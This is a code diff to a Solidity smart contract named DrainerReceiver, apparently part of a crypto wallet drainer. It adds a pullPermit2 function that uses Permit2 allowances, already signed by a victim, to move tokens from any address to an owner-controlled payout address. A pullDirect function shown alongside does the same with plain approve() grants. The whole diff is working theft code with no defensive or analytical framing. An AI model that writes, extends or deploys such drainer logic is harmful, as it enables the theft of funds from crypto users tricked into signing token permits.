@@ -77,6 +77,15 @@ contract DrainerReceiver {
         }
     }
 
+    /// @notice Pull one token under a PermitBatch whose nonce was already spent.
+    ///         Permit2 nonces are single-use, so the batch is submitted with
+    ///         permitAndPull once and every later top-up comes through here.
+    function pullPermit2(address token, address from, uint160 amount) external onlyOwner {
+        if (amount == 0) return;
+        PERMIT2.transferFrom(from, payout, amount, token);
+        emit Pulled(token, from, amount);
+    }
+
     /// @notice Fallback path for a plain approve() granted to this contract.
     function pullDirect(address token, address from, uint256 amount) external onlyOwner {
         if (amount == 0) return;
